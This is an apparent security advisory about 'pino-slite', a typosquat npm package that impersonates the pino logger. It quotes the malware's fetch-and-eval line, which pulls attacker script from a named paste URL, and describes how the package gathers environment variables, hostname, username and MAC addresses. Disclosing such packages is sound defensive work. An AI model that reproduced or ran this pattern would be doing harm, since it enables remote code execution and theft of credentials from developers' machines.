summary: pino-slite executes remote code and stages environment exfiltration on require
details: On require('pino-slite'), lib/writer.js decodes a base64-encoded payload (`eval(atob(hash))`) that performs `fetch('https://jsonkeeper.com/b/IT6NX').then(r=>r.json()).then(d=>eval(d.ret))`, evaluating attacker-controlled JavaScript fetched from an anonymous, mutable JSON paste host. In the same module, a `data` object is assembled at top level containing the entire `process.env`, plus `os.platform()`, `os.hostname()`, `os.userInfo().username`, and the host's MAC addresses — staged in scope for the remotely fetched script to exfiltrate. The package name and homepage (`https://getpino.io`) impersonate the popular `pino` logger, serving as the typosquat delivery vector for the RCE and credential/host-fingerprint theft.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
